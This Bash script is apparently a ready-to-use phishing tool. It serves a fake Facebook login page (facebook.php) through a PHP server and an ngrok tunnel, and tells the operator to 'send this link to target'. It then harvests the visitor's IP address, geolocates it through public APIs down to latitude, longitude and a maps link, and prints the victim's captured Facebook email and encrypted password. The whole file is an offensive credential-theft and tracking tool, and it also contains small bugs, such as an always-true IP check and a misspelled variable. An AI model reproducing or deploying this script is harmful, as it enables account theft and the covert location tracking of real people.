#ip tracker

banner(){
printf '___  _  _ _ ____ _  _ ____ ____ \n'
printf '|__] |__| | [__  |__| |___ |__/ \n'
printf '|    |  | | ___] |  | |___ |  \ \n'
printf '                                \n'

menu
}

menu(){
  printf "\e[0;36m1. Track IP, Phish FB credentials"
  printf "\e[0;36m\n2. Exit"
  printf " \n"
        read -p $'What you wanna do?\n' option

        if [[ $option  == 1 ]]; then
        startserver
        elif [[ $option == 2 ]]; then
        printf '  _     _\n'
        printf '|_)\_/|_ \n'
        printf '|_) | |_ \n'
        printf '         \n'


        sleep 1

        else
        printf "\e[1;31m'Invalid option!' \e[1;34mEither choose 1 or 2\n"
        sleep 1
        menu
        fi
 }

# function to catch and print victim details from APIs

 trackip(){
         userip=$(cat ip.txt)
         printf "\n"

         FromIpApi=$(curl -s -L https://ipapi.co/$userip/json)
         checkIP=$(echo $FromIpApi | grep -Po '(?<="reason":)[^,]*' | tr -d '[]"')
         if [[ $checkIP=="Invalid IP Address" ]]; then
         userip=$(cat ip.txt | cut -d ":" -f1)
        fi


         victimip=$(echo $FromIpApi | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
         victimcity=$(echo $FromIpApi | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimregion=$(echo $FromIpApi | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimregionalcode=$(echo $iFromIpApi | grep -Po '(?<="region_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimcountry=$(echo $FromIpApi | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         FromIpAPicom=$(curl -s "http://ip-api.com/json/$userip" -L)
         victimtime=$(echo $FromIpAPicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimisp=$(echo $FromIpApi | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimasn=$(echo $FromIpApi | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimcurrency=$(echo $FromIpApi | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimcountrycode=$(echo $FromIpApi | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimcallingcode=$(echo $FromIpApi | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimlatitude=$(echo $FromIpApi | grep -Po '(?<="latitude":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimlongitude=$(echo $FromIpApi | grep -Po '(?<="longitude":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
         victimlanguages=$(echo $FromIpApi | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')


         printf "\e[0m\n"
         printf "  \033[1;31m  Ip Address:         \e[0m\e[1;96m:\e[0m\e[1;92m   <<Hidden>>\e[0m\n"
         printf "  \033[1;31m  City                \e[0m\e[1;96m:\e[0m\e[1;92m   $victimcity\e[0m\n"
         printf "  \033[1;31m  Region              \e[0m\e[1;96m:\e[0m\e[1;92m   $victimregion\e[0m\n"
         printf "  \033[1;31m  Regional Code       \e[0m\e[1;96m:\e[0m\e[1;92m   $victimregionalcode\e[0m\n"
         printf "  \033[1;31m  Country             \e[0m\e[1;96m:\e[0m\e[1;92m   $victimcountry\e[0m\n"
         printf "  \033[1;31m  Timezone            \e[0m\e[1;96m:\e[0m\e[1;92m   $victimtime\e[0m\n"
         printf "  \033[1;31m  ISP                 \e[0m\e[1;96m:\e[0m\e[1;92m   $victimisp\e[0m\n"
         printf "  \033[1;31m  ASN                 \e[0m\e[1;96m:\e[0m\e[1;92m   $victimasn\e[0m\n"
         printf "  \033[1;31m  Curreny used        \e[0m\e[1;96m:\e[0m\e[1;92m   $victimcurrency\e[0m\n"
         printf "  \033[1;31m  Country Code        \e[0m\e[1;96m:\e[0m\e[1;92m   $victimcountrycode\e[0m\n"
         printf "  \033[1;31m  Country calling code\e[0m\e[1;96m:\e[0m\e[1;92m   $victimcallingcode\e[0m\n"
         printf "  \033[1;31m  Latitude            \e[0m\e[1;96m:\e[0m\e[1;92m   $victimlatitude\e[0m\n"
         printf "  \033[1;31m  Longitude           \e[0m\e[1;96m:\e[0m\e[1;92m   $victimlongitude\e[0m\n"
         printf "  \033[1;31m  Languages Spoken    \e[0m\e[1;96m:\e[0m\e[1;92m   $victimlanguages\e[0m\n"
         printf "  \033[1;31m  Google Maps url     \e[0m\e[1;96m:\e[0m\e[1;92m   https://maps.google.com/?q=$victimlatitude,$victimlongitude\e[0m\n"
catchcred

 }

 catchcred(){
email=$(cat log.txt | grep email)
encryptedpass=$(cat log.txt | grep encpass)
printf "\n"

# out=$(echo $log | cut -f3,4 -d " ")
printf "\033[1;31m  Victim Facebook credentials:\n  \e[0m\e[1;96m\e[0m\n"
printf "\e[0m\e[1;92m$email\n$encryptedpass\n"
}

 startserver(){
         # supporting tunneling only via ngrok

printf "\e[0;36m -------------------------------\n"
printf "\e[0;36m|                               |\n"
printf "\e[0;36m|       Creating tunnel!        |\n"
printf "\e[0;36m|                               |\n"
printf "\e[0;36m -------------------------------\n"

         start
 }

 start(){

         printf "Starting php server \n\n"
         php -t "/" -S 127.0.0.1:5577 > /dev/null 2>&1 &    #put your current working directory in -t option.
         sleep 2


         printf "Starting ngrok server \n\n"
         ./ngrok http 5577 --log=stdout > ngrok.log &
         sleep 7

         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url)
         printf "send this link to target: \e[1;31m$link/facebook.php\e[0;36m"
         # echo $link
         printf "\n\n"
         found
 }

 found(){
         printf "\n"
         printf " Hold on for someone to click the link\n"

         if [[ -e ip.txt ]]; then
                 # to remove ip.txt of previous victim
                 rm ip.txt
         fi
         sleep 40
         userip=$(grep -a ' r=' ngrok.log | cut -d " " -f8 -d "=" | sed 's/.*\[\([^]]*\)\].*/\1/g' | uniq > ip.txt)
        sleep 5
        if [[ -s ngrok.log && -s ip.txt  ]]; then printf "\e[1;31mFiles check => +ve\n";
         trackip
        fi
         sleep 1

 }

banner
